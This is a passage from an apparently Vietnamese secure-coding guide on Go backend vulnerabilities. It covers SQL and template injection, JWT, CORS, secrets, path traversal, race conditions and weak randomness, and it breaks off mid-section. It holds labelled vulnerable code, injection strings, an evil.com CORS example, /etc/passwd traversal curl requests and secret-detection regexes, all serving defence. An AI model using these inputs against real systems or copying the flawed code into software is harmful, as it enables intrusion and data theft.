# Domain 03: Bảo Mật Và Xác Thực (Security & Authentication)

**Tổng quan:** 12 patterns về lỗi bảo mật và xác thực thường gặp trong Go backend. Mỗi lỗi có thể dẫn đến data breach, RCE, hoặc bypass authentication nếu không được phát hiện và sửa kịp thời.

---

## Pattern 01: SQL Injection Với fmt.Sprintf

### 1. Tên
SQL Injection qua string formatting

### 2. Phân loại
Security / Injection Attack

### 3. Mức nghiêm trọng
CRITICAL 🔴 — Kẻ tấn công có thể đọc, sửa, xóa toàn bộ database, leo thang đặc quyền, và trong một số DBMS có thể thực thi lệnh hệ thống.

### 4. Vấn đề

```
User input ──► fmt.Sprintf("SELECT ... WHERE id='%s'", input)
                     │
                     ▼
          SQL query với input chưa sanitize
                     │
                     ▼
        Database thực thi câu lệnh tùy ý
        (DROP TABLE, UNION SELECT, v.v.)
```

**Ví dụ tấn công:**
- Input: `' OR '1'='1` → bypass authentication
- Input: `'; DROP TABLE users; --` → xóa bảng

### 5. Phát hiện

```bash
# Tìm fmt.Sprintf với query SQL
rg -n "fmt\.Sprintf\s*\(\s*[\"'].*(?:SELECT|INSERT|UPDATE|DELETE|WHERE|FROM)" --type go

# Tìm string concat trực tiếp với query
rg -n '"SELECT.*\+|"INSERT.*\+|"UPDATE.*\+|"DELETE.*\+' --type go

# Tìm Exec/Query với format string
rg -n "\.(?:Exec|Query|QueryRow)\s*\(\s*fmt\.Sprintf" --type go

# Tìm db.Raw trong GORM với string concat
rg -n "db\.Raw\s*\(\s*fmt\.Sprintf|db\.Where\s*\(\s*fmt\.Sprintf" --type go
```

### 6. Giải pháp

```go
// BAD: SQL Injection vulnerability
func getUserByID(db *sql.DB, userID string) (*User, error) {
    query := fmt.Sprintf("SELECT * FROM users WHERE id = '%s'", userID)
    row := db.QueryRow(query)
    // ...
}

func searchUsers(db *sql.DB, name string) ([]User, error) {
    query := "SELECT * FROM users WHERE name = '" + name + "'"
    rows, err := db.Query(query)
    // ...
}

// GOOD: Parameterized queries (Prepared Statements)
func getUserByID(db *sql.DB, userID string) (*User, error) {
    query := "SELECT id, name, email FROM users WHERE id = $1"
    row := db.QueryRow(query, userID)

    var user User
    if err := row.Scan(&user.ID, &user.Name, &user.Email); err != nil {
        if errors.Is(err, sql.ErrNoRows) {
            return nil, ErrUserNotFound
        }
        return nil, fmt.Errorf("getUserByID: %w", err)
    }
    return &user, nil
}

func searchUsers(db *sql.DB, name string) ([]User, error) {
    query := "SELECT id, name, email FROM users WHERE name = $1"
    rows, err := db.Query(query, name)
    if err != nil {
        return nil, fmt.Errorf("searchUsers: %w", err)
    }
    defer rows.Close()

    var users []User
    for rows.Next() {
        var u User
        if err := rows.Scan(&u.ID, &u.Name, &u.Email); err != nil {
            return nil, fmt.Errorf("searchUsers scan: %w", err)
        }
        users = append(users, u)
    }
    return users, rows.Err()
}

// GOOD: Dùng GORM ORM (tránh Raw query với fmt.Sprintf)
func searchUsersGORM(db *gorm.DB, name string) ([]User, error) {
    var users []User
    // GOOD: GORM tự parameterize
    result := db.Where("name = ?", name).Find(&users)
    return users, result.Error
}

// BAD: GORM với string concat - vẫn bị SQL injection!
func searchUsersGORMBad(db *gorm.DB, name string) ([]User, error) {
    var users []User
    // BAD: string concat trực tiếp
    result := db.Where("name = '" + name + "'").Find(&users)
    return users, result.Error
}
```

### 7. Phòng ngừa

```bash
# gosec kiểm tra SQL injection
gosec -include=G201,G202 ./...

# G201: SQL query construction using format string
# G202: SQL query construction using string concatenation

# staticcheck
staticcheck ./...

# sqlvet - công cụ kiểm tra SQL query
go install github.com/houqp/sqlvet/cmd/sqlvet@latest
sqlvet .

# semgrep rules cho Go SQL injection
semgrep --config=p/golang-security ./...
```

**Nguyên tắc:** NEVER dùng fmt.Sprintf, string concat, hay string interpolation để build SQL query. ALWAYS dùng parameterized queries với `?` (MySQL) hoặc `$1` (PostgreSQL).

---

## Pattern 02: Template Injection

### 1. Tên
Server-Side Template Injection (SSTI) trong Go

### 2. Phân loại
Security / Injection Attack

### 3. Mức nghiêm trọng
CRITICAL 🔴 — `text/template` cho phép thực thi hàm Go tùy ý, dẫn đến RCE. `html/template` an toàn hơn nhưng vẫn có thể bị bypass nếu dùng sai.

### 4. Vấn đề

```
User input ──► template.New("").Parse(userInput)
                      │
                      ▼
           Go template với hàm tùy ý
                      │
                      ▼
   {{.System.Exec "rm -rf /"}} → RCE
   {{template "admin"}} → Logic bypass
```

**Sự khác biệt critical:**
- `text/template`: KHÔNG escape HTML, cho phép gọi hàm tùy ý → **nguy hiểm**
- `html/template`: Auto-escape HTML, an toàn hơn cho web output

### 5. Phát hiện

```bash
# Tìm text/template được parse từ user input
rg -n "text/template" --type go

# Tìm template.Must hoặc template.New với biến động
rg -n 'template\.New\s*\(.*\+|template\.ParseFiles\s*\(.*\+' --type go

# Tìm template Execute với user-controlled data
rg -n "\.Execute\s*\(|\.ExecuteTemplate\s*\(" --type go

# Tìm nơi dùng text/template thay vì html/template
rg -n '"text/template"' --type go
```

### 6. Giải pháp

```go
// BAD: Parse template từ user input
import "text/template"

func renderUserTemplate(w http.ResponseWriter, userTemplate string, data interface{}) {
    // CRITICAL: User có thể inject bất kỳ Go template code nào
    tmpl, err := template.New("user").Parse(userTemplate)
    if err != nil {
        http.Error(w, "Template error", 500)
        return
    }
    tmpl.Execute(w, data)
}

// BAD: Dùng text/template cho HTML output
import "text/template"

func renderPage(w http.ResponseWriter, data PageData) {
    // text/template KHÔNG escape HTML → XSS
    tmpl := template.Must(template.ParseFiles("page.html"))
    tmpl.Execute(w, data)
}

// GOOD: Dùng html/template cho web, KHÔNG parse template từ user input
import "html/template"

// Pre-compile templates khi khởi động, không bao giờ parse user input
var pageTemplate = template.Must(template.ParseFiles("templates/page.html"))

func renderPage(w http.ResponseWriter, data PageData) {
    // html/template tự động escape HTML output
    if err := pageTemplate.Execute(w, data); err != nil {
        log.Printf("renderPage: %v", err)
        http.Error(w, "Internal server error", 500)
    }
}

// GOOD: Nếu cần template động, dùng allowlist các template đã định nghĩa sẵn
var allowedTemplates = map[string]*template.Template{
    "profile": template.Must(template.ParseFiles("templates/profile.html")),
    "home":    template.Must(template.ParseFiles("templates/home.html")),
}

func renderAllowedTemplate(w http.ResponseWriter, name string, data interface{}) {
    tmpl, ok := allowedTemplates[name]
    if !ok {
        http.Error(w, "Template not found", 404)
        return
    }
    tmpl.Execute(w, data)
}

// GOOD: Nếu cần customize template, chỉ cho phép data, không cho phép template structure
func renderWithCustomData(w http.ResponseWriter, userConfig UserConfig) {
    // Validate và sanitize data TRƯỚC khi đưa vào template
    safeData := sanitizeUserConfig(userConfig)
    pageTemplate.Execute(w, safeData)
}
```

### 7. Phòng ngừa

```bash
# gosec kiểm tra template injection
gosec -include=G203 ./...

# G203: Use of unescaped data in HTML templates

# Kiểm tra import text/template trong web handlers
rg -n '"text/template"' --type go -l

# Semgrep rule
semgrep --config "r/go.lang.security.audit.xss.import-text-template.import-text-template" ./...
```

**Nguyên tắc:**
1. NEVER parse template từ user input
2. ALWAYS dùng `html/template` (không phải `text/template`) cho web output
3. Pre-compile tất cả templates lúc startup
4. Validate và sanitize data trước khi render

---

## Pattern 03: JWT Validation Thiếu

### 1. Tên
JWT Validation không đầy đủ — Algorithm Confusion & Missing Claims Check

### 2. Phân loại
Security / Authentication Bypass

### 3. Mức nghiêm trọng
CRITICAL 🔴 — Kẻ tấn công có thể tự tạo JWT hợp lệ, bypass authentication, và giả mạo danh tính bất kỳ user nào.

### 4. Vấn đề

```
JWT Header: {"alg": "none"} hoặc {"alg": "HS256"}
                    │
                    ▼
Server không check algorithm ──► Accept token giả mạo
Server không check expiry    ──► Accept token hết hạn
Server không check issuer    ──► Accept token từ service khác
Server không check claims    ──► Privilege escalation
```

**Các lỗi phổ biến:**
- Không validate `alg` field (algorithm confusion attack: RS256 → HS256)
- Không check `exp` claim (expired token)
- Không check `iss` claim (token từ service khác)
- Không check `aud` claim (token dành cho service khác)
- Dùng `jwt.ParseWithClaims` không verify signing method

### 5. Phát hiện

```bash
# Tìm JWT parse không check signing method
rg -n "jwt\.Parse\b|jwt\.ParseWithClaims" --type go

# Tìm jwt validation bỏ qua error
rg -n "jwt\.Parse.*func.*token.*bool\s*{\s*return\s*true" --type go

# Tìm nơi không validate algorithm
rg -n -A5 "jwt\.Parse" --type go | rg -v "SigningMethodHS|SigningMethodRS|Valid\b"

# Tìm MapClaims không check fields
rg -n "MapClaims\b" --type go

# Tìm secret key hardcoded hoặc weak
rg -n 'jwt.*secret.*=.*"[^"]{1,20}"' --type go -i
```

### 6. Giải pháp

```go
// BAD: JWT validation không đầy đủ
import "github.com/golang-jwt/jwt/v5"

func parseTokenBad(tokenString string) (*jwt.Token, error) {
    // BAD: Không check signing method → algorithm confusion attack
    token, err := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
        return []byte("secret"), nil
    })
    return token, err
}

func parseTokenBad2(tokenString string) (string, error) {
    // BAD: Accept any algorithm kể cả "none"
    token, err := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
        return []byte(jwtSecret), nil
    })
    if err != nil || !token.Valid {
        return "", errors.New("invalid token")
    }
    claims := token.Claims.(jwt.MapClaims)
    // BAD: Không check exp, iss, aud
    return claims["sub"].(string), nil
}

// GOOD: JWT validation đầy đủ và chặt chẽ
type Claims struct {
    UserID   int64  `json:"user_id"`
    UserRole string `json:"role"`
    jwt.RegisteredClaims
}

const (
    jwtIssuer   = "myapp-auth-service"
    jwtAudience = "myapp-api"
)

func parseToken(tokenString string) (*Claims, error) {
    claims := &Claims{}

    token, err := jwt.ParseWithClaims(
        tokenString,
        claims,
        func(token *jwt.Token) (interface{}, error) {
            // CRITICAL: Luôn check signing method
            if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
                return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
            }
            return []byte(os.Getenv("JWT_SECRET")), nil
        },
        // Tùy chọn validation bổ sung
        jwt.WithExpirationRequired(),
        jwt.WithIssuedAt(),
        jwt.WithIssuer(jwtIssuer),
        jwt.WithAudience(jwtAudience),
    )

    if err != nil {
        return nil, fmt.Errorf("parseToken: %w", err)
    }

    if !token.Valid {
        return nil, errors.New("token is not valid")
    }

    return claims, nil
}

// GOOD: Generate token đúng cách với đầy đủ claims
func generateToken(userID int64, role string) (string, error) {
    now := time.Now()
    claims := Claims{
        UserID:   userID,
        UserRole: role,
        RegisteredClaims: jwt.RegisteredClaims{
            Issuer:    jwtIssuer,
            Audience:  jwt.ClaimStrings{jwtAudience},
            Subject:   strconv.FormatInt(userID, 10),
            IssuedAt:  jwt.NewNumericDate(now),
            NotBefore: jwt.NewNumericDate(now),
            ExpiresAt: jwt.NewNumericDate(now.Add(24 * time.Hour)),
            ID:        uuid.New().String(), // jti để revoke nếu cần
        },
    }

    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
    secret := os.Getenv("JWT_SECRET")
    if len(secret) < 32 {
        return "", errors.New("JWT_SECRET too short, minimum 32 characters")
    }
    return token.SignedString([]byte(secret))
}

// GOOD: Middleware cho HTTP handler
func JWTMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        authHeader := r.Header.Get("Authorization")
        if !strings.HasPrefix(authHeader, "Bearer ") {
            http.Error(w, "Missing or invalid Authorization header", http.StatusUnauthorized)
            return
        }

        tokenString := strings.TrimPrefix(authHeader, "Bearer ")
        claims, err := parseToken(tokenString)
        if err != nil {
            log.Printf("JWT validation failed: %v", err)
            http.Error(w, "Unauthorized", http.StatusUnauthorized)
            return
        }

        ctx := context.WithValue(r.Context(), contextKeyUserID, claims.UserID)
        ctx = context.WithValue(ctx, contextKeyUserRole, claims.UserRole)
        next.ServeHTTP(w, r.WithContext(ctx))
    })
}
```

### 7. Phòng ngừa

```bash
# gosec kiểm tra JWT issues
gosec -include=G501,G505 ./...

# Kiểm tra secret strength
rg -n 'JWT_SECRET|jwtSecret|jwt_secret' --type go

# Dùng jwt-go v5+ (có nhiều security fix hơn v4)
go get github.com/golang-jwt/jwt/v5

# semgrep JWT rules
semgrep --config "r/go.jwt.security" ./...
```

**Nguyên tắc:**
1. ALWAYS validate signing method trước khi return key
2. ALWAYS set và check `exp`, `iss`, `aud`, `iat`
3. JWT secret tối thiểu 32 ký tự, lưu trong environment variable
4. Dùng RS256/ES256 cho production (public/private key pair)

---

## Pattern 04: CORS Misconfiguration

### 1. Tên
CORS (Cross-Origin Resource Sharing) cấu hình sai

### 2. Phân loại
Security / Access Control

### 3. Mức nghiêm trọng
HIGH 🟠 — Cho phép trang web của kẻ tấn công gọi API với credentials của nạn nhân (CSRF via CORS), có thể dẫn đến data theft và unauthorized actions.

### 4. Vấn đề

```
Attacker website: evil.com
                    │
                    ▼ fetch("https://api.myapp.com/user/data", {credentials: "include"})
                    │
API server: Origin: * với credentials=true ──► Trả về data của nạn nhân
            Allow: evil.com (reflect origin) ──► Trả về data của nạn nhân
```

**Các lỗi phổ biến:**
- `Access-Control-Allow-Origin: *` với `Access-Control-Allow-Credentials: true` (browser sẽ block nhưng đây là bad practice)
- Reflect origin mà không validate (echo bất kỳ Origin nào vào Allow-Origin)
- Allow quá nhiều methods/headers không cần thiết
- Không check Preflight request đúng cách

### 5. Phát hiện

```bash
# Tìm wildcard CORS
rg -n 'Allow-Origin.*\*|AllowOrigins.*\*|AllowAllOrigins' --type go

# Tìm reflect origin (nguy hiểm)
rg -n 'r\.Header\.Get\("Origin"\)' --type go

# Tìm credentials + wildcard
rg -n -A3 'AllowCredentials.*true|Allow-Credentials.*true' --type go

# Tìm CORS middleware configuration
rg -n "cors\." --type go -l

# Kiểm tra gin-contrib/cors hoặc rs/cors config
rg -n "cors\.New\|cors\.Config\b" --type go
```

### 6. Giải pháp

```go
// BAD: CORS quá permissive
import "github.com/rs/cors"

func setupCORSBad(router *http.ServeMux) http.Handler {
    // BAD: Cho phép tất cả origins
    c := cors.New(cors.Options{
        AllowedOrigins:   []string{"*"},
        AllowCredentials: true, // Kết hợp * + credentials = nguy hiểm
        AllowedMethods:   []string{"GET", "POST", "PUT", "DELETE", "OPTIONS", "PATCH"},
        AllowedHeaders:   []string{"*"},
    })
    return c.Handler(router)
}

// BAD: Reflect Origin không validate
func handleCORSBad(w http.ResponseWriter, r *http.Request) {
    // BAD: Echo bất kỳ origin nào mà không kiểm tra
    origin := r.Header.Get("Origin")
    w.Header().Set("Access-Control-Allow-Origin", origin)
    w.Header().Set("Access-Control-Allow-Credentials", "true")
}

// GOOD: CORS với allowlist chặt chẽ
var allowedOrigins = map[string]bool{
    "https://app.mycompany.com":    true,
    "https://admin.mycompany.com":  true,
    "http://localhost:3000":        true, // development only
}

func isAllowedOrigin(origin string) bool {
    // Validate origin theo environment
    if os.Getenv("ENV") == "production" {
        // Production: chỉ allow HTTPS origins của company
        return allowedOrigins[origin] && strings.HasPrefix(origin, "https://")
    }
    return allowedOrigins[origin]
}

func setupCORSGood(router http.Handler) http.Handler {
    c := cors.New(cors.Options{
        AllowOriginFunc:  isAllowedOrigin,
        AllowCredentials: true,
        AllowedMethods:   []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
        AllowedHeaders:   []string{"Authorization", "Content-Type", "X-Request-ID"},
        ExposedHeaders:   []string{"X-Request-ID"},
        MaxAge:           86400, // Preflight cache 24h
    })
    return c.Handler(router)
}

// GOOD: Với Gin framework
import "github.com/gin-contrib/cors"

func setupGinCORS() gin.HandlerFunc {
    config := cors.Config{
        AllowOriginFunc:  isAllowedOrigin,
        AllowMethods:     []string{"GET", "POST", "PUT", "DELETE"},
        AllowHeaders:     []string{"Authorization", "Content-Type"},
        AllowCredentials: true,
        MaxAge:           12 * time.Hour,
    }
    return cors.New(config)
}
```

### 7. Phòng ngừa

```bash
# Kiểm tra CORS configuration trong code
rg -n "AllowedOrigins|AllowOrigins|Allow-Origin" --type go

# Test CORS với curl
curl -H "Origin: https://evil.com" \
     -H "Access-Control-Request-Method: POST" \
     -X OPTIONS \
     https://api.myapp.com/sensitive-endpoint -v

# Nếu response có "Access-Control-Allow-Origin: https://evil.com" → bị lỗi

# OWASP CORS checker
pip install cors-scanner
cors-scanner https://api.myapp.com
```

**Nguyên tắc:**
1. NEVER dùng `*` với `AllowCredentials: true`
2. ALWAYS dùng allowlist cụ thể, không reflect origin tùy tiện
3. Giới hạn allowed methods và headers chỉ những gì cần thiết
4. Khác biệt config giữa development và production

---

## Pattern 05: Hardcoded Secrets

### 1. Tên
Hardcoded Secrets — API keys, passwords, tokens trong source code

### 2. Phân loại
Security / Credential Exposure

### 3. Mức nghiêm trọng
CRITICAL 🔴 — Secrets trong git history tồn tại vĩnh viễn. Kẻ tấn công có thể access toàn bộ infrastructure, database, third-party services.

### 4. Vấn đề

```
Source code ──► git commit ──► GitHub/GitLab (public/private)
                                      │
                                      ▼
                          Bots scan 24/7 tìm secrets
                          (trident, gitrob, gitleaks)
                                      │
                                      ▼
                          AWS key → Crypto mining
                          DB password → Data breach
                          API key → Financial loss
```

**Thời gian phát hiện thực tế:** AWS key leak trên GitHub = bị abuse trong **4 phút** (theo nghiên cứu).

### 5. Phát hiện

```bash
# Tìm các patterns phổ biến của hardcoded secrets
rg -n 'password\s*[:=]\s*"[^"]{4,}"|passwd\s*[:=]\s*"[^"]{4,}"' --type go -i
rg -n 'secret\s*[:=]\s*"[^"]{8,}"|apiKey\s*[:=]\s*"[^"]{8,}"' --type go -i
rg -n 'api_key\s*[:=]\s*"[^"]{8,}"|token\s*[:=]\s*"[^"]{20,}"' --type go -i
rg -n '"sk-[a-zA-Z0-9]{20,}"|"AKIA[A-Z0-9]{16}"' --type go

# Tìm database connection string với credentials
rg -n 'postgres://.*:.*@|mysql://.*:.*@|mongodb://.*:.*@' --type go

# Gitleaks - công cụ chuyên dụng
gitleaks detect --source . --verbose

# truffleHog
trufflehog git file://. --only-verified
```

### 6. Giải pháp

```go
// BAD: Hardcoded secrets
const (
    DBPassword = "super_secret_password_123"         // BAD
    JWTSecret  = "my-jwt-secret-key"                 // BAD
    AWSKey     = "AKIAIOSFODNN7EXAMPLE"               // BAD
    AWSSecret  = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" // BAD
    APIKey     = "sk-proj-abc123xyz789"               // BAD
)

func connectDB() *sql.DB {
    // BAD: Credentials trong code
    db, _ := sql.Open("postgres", "postgres://admin:password123@localhost/mydb")
    return db
}

// GOOD: Load từ environment variables
import (
    "os"
    "github.com/joho/godotenv" // development only
)

type Config struct {
    DBHost     string
    DBPort     string
    DBName     string
    DBUser     string
    DBPassword string
    JWTSecret  string
    AWSKey     string
    AWSSecret  string
}

func LoadConfig() (*Config, error) {
    // Load .env chỉ trong development
    if os.Getenv("ENV") != "production" {
        _ = godotenv.Load() // OK nếu file không tồn tại
    }

    cfg := &Config{
        DBHost:     getEnvOrDefault("DB_HOST", "localhost"),
        DBPort:     getEnvOrDefault("DB_PORT", "5432"),
        DBName:     requireEnv("DB_NAME"),
        DBUser:     requireEnv("DB_USER"),
        DBPassword: requireEnv("DB_PASSWORD"),
        JWTSecret:  requireEnv("JWT_SECRET"),
        AWSKey:     requireEnv("AWS_ACCESS_KEY_ID"),
        AWSSecret:  requireEnv("AWS_SECRET_ACCESS_KEY"),
    }

    // Validate secret strength
    if len(cfg.JWTSecret) < 32 {
        return nil, errors.New("JWT_SECRET must be at least 32 characters")
    }

    return cfg, nil
}

func requireEnv(key string) string {
    val := os.Getenv(key)
    if val == "" {
        log.Fatalf("Required environment variable %s is not set", key)
    }
    return val
}

func getEnvOrDefault(key, defaultVal string) string {
    if val := os.Getenv(key); val != "" {
        return val
    }
    return defaultVal
}

// GOOD: Dùng Secret Manager (AWS Secrets Manager, Vault)
import "github.com/aws/aws-sdk-go-v2/service/secretsmanager"

func getSecretFromAWS(secretName string) (string, error) {
    client := secretsmanager.NewFromConfig(awsConfig)
    result, err := client.GetSecretValue(context.Background(), &secretsmanager.GetSecretValueInput{
        SecretId: aws.String(secretName),
    })
    if err != nil {
        return "", fmt.Errorf("getSecret %s: %w", secretName, err)
    }
    return *result.SecretString, nil
}
```

**File .gitignore (MANDATORY):**
```gitignore
.env
.env.local
.env.production
*.key
*.pem
secrets/
config/secrets.yaml
```

### 7. Phòng ngừa

```bash
# Pre-commit hook với gitleaks
cat > .git/hooks/pre-commit << 'EOF'
#!/bin/sh
gitleaks protect --staged --redact -v
EOF
chmod +x .git/hooks/pre-commit

# gosec
gosec -include=G101 ./...
# G101: Look for hard coded credentials

# Rotate ngay nếu phát hiện leak
# 1. Revoke key/token bị leak
# 2. Audit access logs
# 3. Rotate credential mới
# 4. Remove khỏi git history: git-filter-repo
git-filter-repo --path sensitive-file.txt --invert-paths
```

---

## Pattern 06: Path Traversal

### 1. Tên
Path Traversal (Directory Traversal) — Đọc file ngoài phạm vi cho phép

### 2. Phân loại
Security / File System Attack

### 3. Mức nghiêm trọng
CRITICAL 🔴 — Kẻ tấn công có thể đọc `/etc/passwd`, private keys, config files, source code, và bất kỳ file nào server có quyền đọc.

### 4. Vấn đề

```
Request: GET /download?file=../../etc/passwd
                              │
                              ▼
filepath.Join("/uploads", "../../etc/passwd")
= "/etc/passwd"  ← Đọc system file!

Request: GET /download?file=../config/database.yml
→ Đọc database credentials
```

### 5. Phát hiện

```bash
# Tìm filepath.Join với user input
rg -n "filepath\.Join\s*\(.*r\.(?:URL|Form|Query)" --type go

# Tìm os.Open, ioutil.ReadFile với user input
rg -n "os\.Open\s*\(.*r\.\|ioutil\.ReadFile\s*\(.*r\." --type go

# Tìm http.ServeFile với dynamic path
rg -n "http\.ServeFile\s*\(|http\.ServeContent\s*\(" --type go

# Tìm path.Join (không normalize đúng trên Windows)
rg -n "path\.Join" --type go

# Tìm user input dùng trực tiếp trong file operations
rg -n "os\.ReadFile|os\.Open|ioutil\.ReadFile" --type go -A2
```

### 6. Giải pháp

```go
// BAD: Path traversal vulnerability
func downloadFile(w http.ResponseWriter, r *http.Request) {
    fileName := r.URL.Query().Get("file")
    // BAD: Không validate, ../../../etc/passwd hoạt động
    filePath := filepath.Join("/var/uploads", fileName)
    http.ServeFile(w, r, filePath)
}

func readUserFile(w http.ResponseWriter, r *http.Request) {
    userFile := r.FormValue("filename")
    // BAD: string concat không an toàn
    content, err := os.ReadFile("/uploads/" + userFile)
    if err != nil {
        http.Error(w, "File not found", 404)
        return
    }
    w.Write(content)
}

// GOOD: Validate và sanitize path
func downloadFile(w http.ResponseWriter, r *http.Request) {
    fileName := r.URL.Query().Get("file")

    // Bước 1: Validate filename (chỉ cho phép ký tự an toàn)
    if !isValidFileName(fileName) {
        http.Error(w, "Invalid file name", http.StatusBadRequest)
        return
    }

    // Bước 2: Clean path và đảm bảo trong base directory
    baseDir, _ := filepath.Abs("/var/uploads")
    requestedPath, err := filepath.Abs(filepath.Join(baseDir, filepath.Clean(fileName)))
    if err != nil {
        http.Error(w, "Invalid path", http.StatusBadRequest)
        return
    }

    // Bước 3: Kiểm tra path có nằm trong base directory không
    if !strings.HasPrefix(requestedPath, baseDir+string(filepath.Separator)) {
        http.Error(w, "Access denied", http.StatusForbidden)
        return
    }

    // Bước 4: Kiểm tra file tồn tại và là regular file
    info, err := os.Stat(requestedPath)
    if err != nil || info.IsDir() {
        http.Error(w, "File not found", http.StatusNotFound)
        return
    }

    http.ServeFile(w, r, requestedPath)
}

func isValidFileName(name string) bool {
    if name == "" || len(name) > 255 {
        return false
    }
    // Chỉ cho phép alphanumeric, dash, underscore, dot
    matched, _ := regexp.MatchString(`^[a-zA-Z0-9._-]+$`, name)
    if !matched {
        return false
    }
    // Không cho phép hidden files hoặc path separators
    if strings.HasPrefix(name, ".") || strings.Contains(name, "/") || strings.Contains(name, "\\") {
        return false
    }
    return true
}

// GOOD: Dùng http.FileServer với custom FS để giới hạn access
func setupFileServer() http.Handler {
    // Chỉ serve files trong /var/uploads
    uploadDir := http.Dir("/var/uploads")
    return http.StripPrefix("/files/", http.FileServer(uploadDir))
}

// GOOD: Lưu file reference trong DB thay vì expose path trực tiếp
func downloadFileByID(w http.ResponseWriter, r *http.Request) {
    fileID := r.URL.Query().Get("id")
    // Lookup file path từ database (trusted source)
    filePath, err := db.GetFilePathByID(fileID)
    if err != nil || filePath == "" {
        http.Error(w, "File not found", 404)
        return
    }
    // filePath từ DB là trusted, không cần sanitize từ user input
    http.ServeFile(w, r, filePath)
}
```

### 7. Phòng ngừa

```bash
# gosec
gosec -include=G304,G305 ./...
# G304: File path provided as taint input
# G305: File traversal when extracting zip/tar archive

# Semgrep path traversal rules
semgrep --config "r/go.lang.security.audit.path-traversal" ./...

# Test với curl
curl "https://api.myapp.com/download?file=../../etc/passwd"
curl "https://api.myapp.com/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

---

## Pattern 07: Race Condition Trong Auth Check

### 1. Tên
TOCTOU Race Condition trong Authentication/Authorization

### 2. Phân loại
Security / Race Condition

### 3. Mức nghiêm trọng
HIGH 🟠 — Trong concurrent requests, kẻ tấn công có thể exploit khoảng thời gian giữa lúc check permission và lúc thực hiện action để bypass authorization.

### 4. Vấn đề

```
Goroutine 1 (attacker):          Goroutine 2 (server):
                                 Check: user.Balance >= amount (OK)
Delete account ──────────────►   [account deleted here]
                                 Execute: debit(user.ID, amount)
                                 → PANIC hoặc debit deleted account
```

**TOCTOU = Time-Of-Check to Time-Of-Use**

```
Time 1: Check(permission) ─────► True
          │
          │ [Window of vulnerability]
          │
Time 2: Use(resource) ──────────► Action thực hiện với permission đã thay đổi
```

### 5. Phát hiện

```bash
# Tìm check rồi execute mà không lock
rg -n "if.*permission\|if.*authorized\|if.*isAdmin" --type go -A5

# Tìm balance check không atomic
rg -n "balance.*>=\|amount.*<=" --type go -A3

# Tìm map access không có mutex trong concurrent context
rg -n "sessions\[|cache\[|store\[" --type go

# Tìm global var được read/write trong goroutines
rg -n "^var\s+\w+\s+=" --type go
```

### 6. Giải pháp

```go
// BAD: TOCTOU race condition
type AccountService struct {
    db *sql.DB
}

func (s *AccountService) Transfer(fromID, toID int64, amount float64) error {
    // BAD: Check và execute không atomic
    var balance float64
    s.db.QueryRow("SELECT balance FROM accounts WHERE id = $1", fromID).Scan(&balance)

    if balance < amount {  // Check ở đây...
        return errors.New("insufficient balance")
    }

    // ...nhưng balance có thể thay đổi giữa check và execute
    // nếu có concurrent request khác cùng transfer
    s.db.Exec("UPDATE accounts SET balance = balance - $1 WHERE id = $2", amount, fromID)
    s.db.Exec("UPDATE accounts SET balance = balance + $1 WHERE id = $2", amount, toID)
    return nil
}

// BAD: In-memory auth check không thread-safe
var activeSessions = map[string]UserSession{}

func isAuthenticated(sessionID string) bool {
    // BAD: Map read không safe với concurrent write
    session, exists := activeSessions[sessionID]
    if !exists {
        return false
    }
    return session.ExpiresAt.After(time.Now())
}

// GOOD: Database-level atomic operation
func (s *AccountService) Transfer(fromID, toID int64, amount float64) error {
    tx, err := s.db.Begin()
    if err != nil {
        return fmt.Errorf("begin transaction: %w", err)
    }
    defer tx.Rollback()

    // GOOD: SELECT FOR UPDATE lock row, atomic check+execute trong transaction
    var balance float64
    err = tx.QueryRow(
        "SELECT balance FROM accounts WHERE id = $1 FOR UPDATE",
        fromID,
    ).Scan(&balance)
    if err != nil {
        return fmt.Errorf("get balance: %w", err)
    }

    if balance < amount {
        return errors.New("insufficient balance")
    }

    // Execute trong cùng transaction đang hold lock
    _, err = tx.Exec(
        "UPDATE accounts SET balance = balance - $1 WHERE id = $2 AND balance >= $1",
        amount, fromID,
    )
    if err != nil {
        return fmt.Errorf("debit: %w", err)
    }

    _, err = tx.Exec(
        "UPDATE accounts SET balance = balance + $1 WHERE id = $2",
        amount, toID,
    )
    if err != nil {
        return fmt.Errorf("credit: %w", err)
    }

    return tx.Commit()
}

// GOOD: Thread-safe session store với sync.RWMutex
type SessionStore struct {
    mu       sync.RWMutex
    sessions map[string]UserSession
}

func NewSessionStore() *SessionStore {
    return &SessionStore{
        sessions: make(map[string]UserSession),
    }
}

func (s *SessionStore) IsAuthenticated(sessionID string) bool {
    s.mu.RLock()
    defer s.mu.RUnlock()
    session, exists := s.sessions[sessionID]
    if !exists {
        return false
    }
    return session.ExpiresAt.After(time.Now())
}

func (s *SessionStore) Set(sessionID string, session UserSession) {
    s.mu.Lock()
    defer s.mu.Unlock()
    s.sessions[sessionID] = session
}

func (s *SessionStore) Delete(sessionID string) {
    s.mu.Lock()
    defer s.mu.Unlock()
    delete(s.sessions, sessionID)
}

// GOOD: Dùng sync.Map cho high-concurrency
var sessionCache sync.Map

func isAuthenticatedSyncMap(sessionID string) bool {
    val, ok := sessionCache.Load(sessionID)
    if !ok {
        return false
    }
    session := val.(UserSession)
    return session.ExpiresAt.After(time.Now())
}
```

### 7. Phòng ngừa

```bash
# Go race detector (MANDATORY trong CI/CD)
go test -race ./...
go run -race main.go

# Tích hợp vào CI
# .github/workflows/test.yml
# - run: go test -race -count=1 ./...

# go vet kiểm tra một số race conditions
go vet ./...

# staticcheck
staticcheck ./...
```

---

## Pattern 08: crypto/rand vs math/rand

### 1. Tên
Dùng math/rand thay vì crypto/rand cho mục đích bảo mật

### 2. Phân loại
Security / Weak Cryptography

### 3. Mức nghiêm trọng
CRITICAL 🔴 — `math/rand` là PRNG có thể predict được. Dùng cho session tokens, OTP, password reset, thì kẻ tấn công có thể brute-force hoặc predict giá trị tiếp theo.

### 4. Vấn đề

```
math/rand.Seed(time.Now().UnixNano())
    │
    ▼
Seed = unix timestamp (seconds or nanoseconds)
    │
    ▼
Kẻ tấn công biết approximate time ──► Brute force seed
    │
    ▼
Predict tất cả random values tiếp theo
    │
    ▼
